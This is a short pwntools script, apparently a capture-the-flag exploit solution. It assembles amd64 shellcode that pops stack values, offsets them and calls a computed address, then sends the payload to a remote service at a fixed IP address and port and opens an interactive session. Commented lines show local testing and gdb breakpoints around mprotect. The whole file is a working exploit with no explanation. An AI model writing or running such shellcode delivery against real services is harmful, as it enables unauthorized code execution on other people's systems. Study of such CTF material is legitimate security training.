from pwn import *


context(arch='amd64', bits=64, os='linux')
# r.interactive()

payload = asm(
'''
	pop rdi
	add rdi, 2098580
	pop rdx
	sub rdx, 784
	call rdx
'''
	)
r = remote('18.222.179.254', 10004)
# r = process('./shellcode')
# gdb.attach(r, '''
# 	b mprotect
# 	c
# 	fin
# 	i r rip
# 	b * $rip+93
# 	c
#''')
log.info(str(payload.__len__()))
log.info(payload)
r.sendline(payload)
r.interactive()
